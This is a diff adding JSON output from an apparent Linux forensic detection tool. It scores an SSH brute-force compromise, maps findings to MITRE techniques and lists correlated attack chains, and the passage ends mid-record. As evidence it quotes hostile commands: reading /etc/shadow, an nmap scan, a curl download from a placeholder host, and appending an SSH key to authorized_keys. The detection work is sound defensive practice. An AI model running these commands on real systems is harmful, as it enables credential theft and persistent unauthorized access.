+                    "PRIVILEGE_ESCALATION"
+                ],
+                "finding_count": 3,
+                "event_count": 7,
+                "evidence_sources": [
+                    "auth.log"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": [
+                    {
+                        "type": "IDENTITY_CORRELATION",
+                        "reason": "Findings share one or more user identities.",
+                        "users": [
+                            "admin",
+                            "root"
+                        ],
+                        "confidence": 85
+                    },
+                    {
+                        "type": "SOURCE_CORRELATION",
+                        "reason": "Findings share one or more network source indicators.",
+                        "source_ips": [
+                            "192.0.2.50"
+                        ],
+                        "confidence": 90
+                    },
+                    {
+                        "type": "TEMPORAL_CORRELATION",
+                        "reason": "Related findings occurred within the investigation window.",
+                        "duration_seconds": 131.0,
+                        "confidence": 75
+                    }
+                ]
+            }
+        }
+    ],
+    "risk_score": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "confidence": 100,
+        "factors": [
+            {
+                "type": "finding",
+                "finding_id": "BRUTE-FORCE-0001",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "BRUTE-FORCE-SUCCESS-0001",
+                "severity": "CRITICAL",
+                "points": 40
+            },
+            {
+                "type": "finding",
+                "finding_id": "PRIV-ESC-0001",
+                "severity": "CRITICAL",
+                "points": 40
+            },
+            {
+                "type": "finding",
+                "finding_id": "PRIV-ESC-0002",
+                "severity": "CRITICAL",
+                "points": 40
+            },
+            {
+                "type": "finding",
+                "finding_id": "PRIV-ESC-0003",
+                "severity": "CRITICAL",
+                "points": 40
+            },
+            {
+                "type": "finding",
+                "finding_id": "PRIV-ESC-0004",
+                "severity": "CRITICAL",
+                "points": 40
+            },
+            {
+                "type": "finding",
+                "finding_id": "PRIV-ESC-0005",
+                "severity": "CRITICAL",
+                "points": 40
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0001",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0002",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0003",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0004",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0005",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0006",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0007",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "PERSISTENCE-0001",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "NETWORK-ACTIVITY-0001",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "NETWORK-ACTIVITY-0002",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "persistence",
+                "chain_id": "CHAIN-0009",
+                "points": 10
+            },
+            {
+                "type": "attack_chain",
+                "chain_id": "CHAIN-0010",
+                "reason": "multi-stage attack chain",
+                "points": 15
+            },
+            {
+                "type": "attack_chain",
+                "chain_id": "CHAIN-0011",
+                "reason": "multi-stage attack chain",
+                "points": 15
+            }
+        ]
+    },
+    "mitre": [
+        {
+            "technique_id": "T1110.001",
+            "name": "Password Guessing",
+            "tactic": "Credential Access",
+            "description": "Repeated authentication attempts against an SSH account are consistent with password guessing.",
+            "finding_ids": [
+                "BRUTE-FORCE-0001",
+                "BRUTE-FORCE-SUCCESS-0001"
+            ],
+            "event_ids": [
+                "AUTH-00001",
+                "AUTH-00002",
+                "AUTH-00003",
+                "AUTH-00004",
+                "AUTH-00005",
+                "AUTH-00006"
+            ]
+        },
+        {
+            "technique_id": "T1548.003",
+            "name": "Sudo and Sudo Caching",
+            "tactic": "Privilege Escalation",
+            "description": "Sudo was used to execute a command with higher local privileges.",
+            "finding_ids": [
+                "PRIV-ESC-0001",
+                "PRIV-ESC-0002",
+                "PRIV-ESC-0003",
+                "PRIV-ESC-0004",
+                "PRIV-ESC-0005"
+            ],
+            "event_ids": [
+                "SUDO-00001",
+                "SUDO-00002",
+                "SUDO-00003",
+                "SUDO-00004",
+                "AUTH-00007"
+            ]
+        },
+        {
+            "technique_id": "T1003",
+            "name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "description": "Credential-related system files or artifacts were accessed.",
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0001",
+                "SUSPICIOUS-CMD-0002",
+                "SUSPICIOUS-CMD-0006",
+                "SUSPICIOUS-CMD-0007"
+            ],
+            "event_ids": [
+                "BASH-00004",
+                "BASH-00005",
+                "BASH-00009",
+                "SUDO-00002"
+            ]
+        },
+        {
+            "technique_id": "T1105",
+            "name": "Ingress Tool Transfer",
+            "tactic": "Command and Control",
+            "description": "Content was retrieved from a remote location.",
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0005"
+            ],
+            "event_ids": [
+                "BASH-00008"
+            ]
+        },
+        {
+            "technique_id": "T1098.004",
+            "name": "SSH Authorized Keys",
+            "tactic": "Persistence",
+            "description": "SSH authorized keys were modified.",
+            "finding_ids": [
+                "PERSISTENCE-0001"
+            ],
+            "event_ids": [
+                "BASH-00009"
+            ]
+        },
+        {
+            "technique_id": "T1049",
+            "name": "System Network Connections Discovery",
+            "tactic": "Discovery",
+            "description": "Active network connections were enumerated.",
+            "finding_ids": [
+                "NETWORK-ACTIVITY-0001"
+            ],
+            "event_ids": [
+                "BASH-00006"
+            ]
+        },
+        {
+            "technique_id": "T1046",
+            "name": "Network Service Scanning",
+            "tactic": "Discovery",
+            "description": "Network services were enumerated.",
+            "finding_ids": [
+                "NETWORK-ACTIVITY-0002"
+            ],
+            "event_ids": [
+                "BASH-00007"
+            ]
+        }
+    ],
+    "attack_story": {
+        "title": "Linux Digital Detective Investigation",
+        "narrative": [
+            "Repeated SSH authentication failures were detected from 192.0.2.50 against account(s) admin, root. This behavior is consistent with credential-guessing activity.",
+            "A successful SSH authentication occurred after the failed authentication sequence. This materially increases the likelihood that the targeted account was successfully accessed.",
+            "The authentication sequence was followed by an SSH session, providing additional evidence of successful account access.",
+            "A privilege transition was detected through sudo execution. This indicates that the authenticated account obtained higher local privileges and requires investigation. Observed command(s): /usr/bin/id; /usr/bin/cat /etc/shadow; /usr/bin/apt-get update; /usr/bin/systemctl status ssh; /bin/bash.",
+            "Credential-access behavior was observed, indicating possible attempts to obtain or inspect authentication material.",
+            "Network reconnaissance activity was detected, indicating possible enumeration of services, network configuration, or active connections.",
+            "Persistence-related activity was detected, suggesting a possible attempt to maintain access beyond the initial session.",
+            "Remote content transfer or command-and-control behavior was observed."
+        ],
+        "conclusion": "The available evidence is consistent with an SSH-based compromise involving repeated authentication failures, subsequent successful authentication, and a later privilege transition to a higher-privileged account. Observed user=admin, root and source=192.0.2.50. Overall assessed risk is CRITICAL (100/100).",
+        "risk_score": {
+            "score": 100,
+            "severity": "CRITICAL",
+            "confidence": 100,
+            "factors": [
+                {
+                    "type": "finding",
+                    "finding_id": "BRUTE-FORCE-0001",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "BRUTE-FORCE-SUCCESS-0001",
+                    "severity": "CRITICAL",
+                    "points": 40
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PRIV-ESC-0001",
+                    "severity": "CRITICAL",
+                    "points": 40
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PRIV-ESC-0002",
+                    "severity": "CRITICAL",
+                    "points": 40
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PRIV-ESC-0003",
+                    "severity": "CRITICAL",
+                    "points": 40
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PRIV-ESC-0004",
+                    "severity": "CRITICAL",
+                    "points": 40
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PRIV-ESC-0005",
+                    "severity": "CRITICAL",
+                    "points": 40
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0001",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0002",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0003",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0004",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0005",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0006",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0007",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PERSISTENCE-0001",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "NETWORK-ACTIVITY-0001",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "NETWORK-ACTIVITY-0002",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "persistence",
+                    "chain_id": "CHAIN-0009",
+                    "points": 10
+                },
+                {
+                    "type": "attack_chain",
+                    "chain_id": "CHAIN-0010",
+                    "reason": "multi-stage attack chain",
+                    "points": 15
+                },
+                {
+                    "type": "attack_chain",
+                    "chain_id": "CHAIN-0011",
+                    "reason": "multi-stage attack chain",
+                    "points": 15
+                }
+            ]
+        },
+        "attack_chains": [
+            {
+                "chain_id": "CHAIN-0001",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across CREDENTIAL_ACCESS involving an unidentified user from an unidentified source.",
+                "severity": "HIGH",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:28+00:00",
+                "end_time": "2025-10-11T15:41:28+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0001-STEP-01",
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/passwd",
+                        "timestamp": "2025-10-11T15:41:28+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00004"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0001"
+                        ],
+                        "indicators": [
+                            "/etc/passwd",
+                            "passwd"
+                        ],
+                        "metadata": {
+                            "category": "CREDENTIAL_ACCESS",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0001"
+                ],
+                "event_ids": [
+                    "BASH-00004"
+                ],
+                "metadata": {
+                    "stages": [
+                        "CREDENTIAL_ACCESS"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0002",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across CREDENTIAL_ACCESS involving an unidentified user from an unidentified source.",
+                "severity": "HIGH",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:30+00:00",
+                "end_time": "2025-10-11T15:41:30+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0002-STEP-01",
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow",
+                        "timestamp": "2025-10-11T15:41:30+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00005"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0002"
+                        ],
+                        "indicators": [
+                            "/etc/shadow",
+                            "shadow"
+                        ],
+                        "metadata": {
+                            "category": "CREDENTIAL_ACCESS",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0002"
+                ],
+                "event_ids": [
+                    "BASH-00005"
+                ],
+                "metadata": {
+                    "stages": [
+                        "CREDENTIAL_ACCESS"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0003",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+                "severity": "MEDIUM",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:32+00:00",
+                "end_time": "2025-10-11T15:41:32+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0003-STEP-01",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Network Reconnaissance Command",
+                        "description": "The command contains a network discovery or connection utility. Observed command: ss -tulnp",
+                        "timestamp": "2025-10-11T15:41:32+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00006"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0003"
+                        ],
+                        "indicators": [
+                            "ss -"
+                        ],
+                        "metadata": {
+                            "category": "NETWORK_RECON",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0003"
+                ],
+                "event_ids": [
+                    "BASH-00006"
+                ],
+                "metadata": {
+                    "stages": [
+                        "RECONNAISSANCE"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0004",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+                "severity": "MEDIUM",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:32+00:00",
+                "end_time": "2025-10-11T15:41:32+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0004-STEP-01",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Network Connection Enumeration",
+                        "description": "The command enumerates active or listening network connections. Observed command: ss -tulnp",
+                        "timestamp": "2025-10-11T15:41:32+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00006"
+                        ],
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0001"
+                        ],
+                        "indicators": [
+                            "ss -"
+                        ],
+                        "metadata": {
+                            "category": "CONNECTION_ENUMERATION",
+                            "event_type": "NETWORK_ACTIVITY",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "NETWORK-ACTIVITY-0001"
+                ],
+                "event_ids": [
+                    "BASH-00006"
+                ],
+                "metadata": {
+                    "stages": [
+                        "RECONNAISSANCE"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0005",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+                "severity": "MEDIUM",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:34+00:00",
+                "end_time": "2025-10-11T15:41:34+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0005-STEP-01",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Network Reconnaissance Command",
+                        "description": "The command contains a network discovery or connection utility. Observed command: nmap -sV 192.0.2.0/24",
+                        "timestamp": "2025-10-11T15:41:34+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00007"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0004"
+                        ],
+                        "indicators": [
+                            "nmap "
+                        ],
+                        "metadata": {
+                            "category": "NETWORK_RECON",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0004"
+                ],
+                "event_ids": [
+                    "BASH-00007"
+                ],
+                "metadata": {
+                    "stages": [
+                        "RECONNAISSANCE"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0006",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+                "severity": "HIGH",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:34+00:00",
+                "end_time": "2025-10-11T15:41:34+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0006-STEP-01",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Port Scanning Activity",
+                        "description": "A network scanning utility was executed and may indicate reconnaissance against network hosts or services. Observed command: nmap -sV 192.0.2.0/24",
+                        "timestamp": "2025-10-11T15:41:34+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00007"
+                        ],
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0002"
+                        ],
+                        "indicators": [
+                            "nmap "
+                        ],
+                        "metadata": {
+                            "category": "PORT_SCAN",
+                            "event_type": "NETWORK_ACTIVITY",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "NETWORK-ACTIVITY-0002"
+                ],
+                "event_ids": [
+                    "BASH-00007"
+                ],
+                "metadata": {
+                    "stages": [
+                        "RECONNAISSANCE"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0007",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across COMMAND_AND_CONTROL involving an unidentified user from an unidentified source.",
+                "severity": "MEDIUM",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:37+00:00",
+                "end_time": "2025-10-11T15:41:37+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0007-STEP-01",
+                        "stage": "COMMAND_AND_CONTROL",
+                        "title": "Suspicious File Download Command",
+                        "description": "A command capable of downloading remote content was executed. Observed command: curl -O https://example.invalid/update.bin",
+                        "timestamp": "2025-10-11T15:41:37+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00008"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0005"
+                        ],
+                        "indicators": [
+                            "curl "
+                        ],
+                        "metadata": {
+                            "category": "DOWNLOAD",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0005"
+                ],
+                "event_ids": [
+                    "BASH-00008"
+                ],
+                "metadata": {
+                    "stages": [
+                        "COMMAND_AND_CONTROL"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0008",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across CREDENTIAL_ACCESS involving an unidentified user from an unidentified source.",
+                "severity": "HIGH",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:40+00:00",
+                "end_time": "2025-10-11T15:41:40+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0008-STEP-01",
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "description": "The command references credential stores or SSH authentication material. Observed command: echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+                        "timestamp": "2025-10-11T15:41:40+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00009"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0006"
+                        ],
+                        "indicators": [
+                            ".ssh/authorized_keys"
+                        ],
+                        "metadata": {
+                            "category": "CREDENTIAL_ACCESS",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0006"
+                ],
+                "event_ids": [
+                    "BASH-00009"
+                ],
+                "metadata": {
+                    "stages": [
+                        "CREDENTIAL_ACCESS"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0009",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 1 correlated activity step(s) across PERSISTENCE involving an unidentified user from an unidentified source.",
+                "severity": "HIGH",
+                "confidence": 60,
+                "start_time": "2025-10-11T15:41:40+00:00",
+                "end_time": "2025-10-11T15:41:40+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0009-STEP-01",
+                        "stage": "PERSISTENCE",
+                        "title": "SSH Authorized Keys Persistence",
+                        "description": "The command references an SSH authorized_keys file, which may be used to establish persistent SSH access. Observed command: echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+                        "timestamp": "2025-10-11T15:41:40+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00009"
+                        ],
+                        "finding_ids": [
+                            "PERSISTENCE-0001"
+                        ],
+                        "indicators": [
+                            "authorized_keys",
+                            ".ssh/authorized_keys"
+                        ],
+                        "metadata": {
+                            "category": "SSH_AUTHORIZED_KEYS",
+                            "event_type": "PERSISTENCE_DETECTED",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "PERSISTENCE-0001"
+                ],
+                "event_ids": [
+                    "BASH-00009"
+                ],
+                "metadata": {
+                    "stages": [
+                        "PERSISTENCE"
+                    ],
+                    "finding_count": 1,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": []
+                }
+            },
+            {
+                "chain_id": "CHAIN-0010",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 5 correlated activity step(s) across PRIVILEGE_ESCALATION, CREDENTIAL_ACCESS involving user admin, root from an unidentified source. Cross-evidence correlation linked 2 investigation signal(s).",
+                "severity": "CRITICAL",
+                "confidence": 100,
+                "start_time": "2026-10-06T15:41:24+00:00",
+                "end_time": "2026-10-06T15:41:32+00:00",
+                "source_ips": [],
+                "usernames": [
+                    "admin",
+                    "root"
+                ],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0010-STEP-01",
+                        "stage": "PRIVILEGE_ESCALATION",
+                        "title": "Potential Privilege Escalation Detected",
+                        "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                        "timestamp": "2026-10-06T15:41:24+00:00",
+                        "severity": "CRITICAL",
+                        "event_ids": [
+                            "SUDO-00001"
+                        ],
+                        "finding_ids": [
+                            "PRIV-ESC-0001"
+                        ],
+                        "indicators": [
+                            "sudo",
+                            "target_user=root"
+                        ],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "PRIVILEGE_ESCALATION",
+                            "source": null,
+                            "evidence_sources": [
+                                "sudo"
+                            ]
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0010-STEP-02",
+                        "stage": "PRIVILEGE_ESCALATION",
+                        "title": "Potential Privilege Escalation Detected",
+                        "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                        "timestamp": "2026-10-06T15:41:26+00:00",
+                        "severity": "CRITICAL",
+                        "event_ids": [
+                            "SUDO-00002"
+                        ],
+                        "finding_ids": [
+                            "PRIV-ESC-0002"
+                        ],
+                        "indicators": [
+                            "sudo",
+                            "target_user=root"
+                        ],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "PRIVILEGE_ESCALATION",
+                            "source": null,
+                            "evidence_sources": [
+                                "sudo"
+                            ]
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0010-STEP-03",
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "description": "The command references credential stores or SSH authentication material. Observed command: /usr/bin/cat /etc/shadow",
+                        "timestamp": "2026-10-06T15:41:26+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "SUDO-00002"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0007"
+                        ],
+                        "indicators": [
+                            "/etc/shadow",
+                            "shadow"
+                        ],
+                        "metadata": {
+                            "category": "CREDENTIAL_ACCESS",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "sudo"
+                            ]
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0010-STEP-04",
+                        "stage": "PRIVILEGE_ESCALATION",
+                        "title": "Potential Privilege Escalation Detected",
+                        "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                        "timestamp": "2026-10-06T15:41:29+00:00",
+                        "severity": "CRITICAL",
+                        "event_ids": [
+                            "SUDO-00003"
+                        ],
+                        "finding_ids": [
+                            "PRIV-ESC-0003"
+                        ],
+                        "indicators": [
+                            "sudo",
+                            "target_user=root"
+                        ],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "PRIVILEGE_ESCALATION",
+                            "source": null,
+                            "evidence_sources": [
+                                "sudo"
+                            ]
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0010-STEP-05",
+                        "stage": "PRIVILEGE_ESCALATION",
+                        "title": "Potential Privilege Escalation Detected",
+                        "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                        "timestamp": "2026-10-06T15:41:32+00:00",
+                        "severity": "CRITICAL",
+                        "event_ids": [
+                            "SUDO-00004"
+                        ],
+                        "finding_ids": [
+                            "PRIV-ESC-0004"
+                        ],
+                        "indicators": [
+                            "sudo",
+                            "target_user=root"
+                        ],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "PRIVILEGE_ESCALATION",
+                            "source": null,
+                            "evidence_sources": [
+                                "sudo"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "PRIV-ESC-0001",
+                    "PRIV-ESC-0002",
+                    "SUSPICIOUS-CMD-0007",
+                    "PRIV-ESC-0003",
+                    "PRIV-ESC-0004"
+                ],
+                "event_ids": [
+                    "SUDO-00001",
+                    "SUDO-00002",
+                    "SUDO-00003",
+                    "SUDO-00004"
+                ],
+                "metadata": {
+                    "stages": [
+                        "PRIVILEGE_ESCALATION",
+                        "CREDENTIAL_ACCESS"
+                    ],
+                    "finding_count": 5,
+                    "event_count": 4,
+                    "evidence_sources": [
+                        "sudo"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": [
+                        {
+                            "type": "IDENTITY_CORRELATION",
+                            "reason": "Findings share one or more user identities.",
+                            "users": [
+                                "admin",
+                                "root"
+                            ],
+                            "confidence": 85
+                        },
+                        {
+                            "type": "TEMPORAL_CORRELATION",
+                            "reason": "Related findings occurred within the investigation window.",
+                            "duration_seconds": 8.0,
+                            "confidence": 75
+                        }
+                    ]
+                }
+            },
+            {
+                "chain_id": "CHAIN-0011",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Investigation identified 3 correlated activity step(s) across INITIAL_ACCESS, PRIVILEGE_ESCALATION involving user admin, root from source 192.0.2.50. Cross-evidence correlation linked 3 investigation signal(s).",
+                "severity": "CRITICAL",
+                "confidence": 85,
+                "start_time": "2026-10-06T22:14:03+00:00",
